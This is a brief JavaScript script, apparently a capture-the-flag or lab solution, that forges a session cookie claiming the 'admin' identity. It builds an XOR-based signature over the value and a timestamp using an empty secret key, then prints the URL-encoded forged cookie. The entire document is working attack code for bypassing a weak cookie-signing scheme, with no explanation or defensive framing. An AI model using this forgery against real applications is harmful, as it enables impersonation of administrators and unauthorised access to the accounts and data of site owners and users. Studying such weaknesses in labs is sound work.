function xorStrings(str1, str2) {
    return Array.from({ length: Math.max(str1.length, str2.length) }, (_, i) =>
      String.fromCharCode(str1.charCodeAt(i % str1.length) ^ str2.charCodeAt(i % str2.length))
    ).join('');
}
  
let secret_key = "";
let new_value = "admin";
let new_timestamp = new Date().toISOString();
let new_signature = btoa(xorStrings(xorStrings(xorStrings(new_value, secret_key), new_timestamp), secret_key));
let forged_cookie = `${new_value}|${new_timestamp}|${new_signature}`;
console.log("New Cookie:", encodeURIComponent(forged_cookie));
  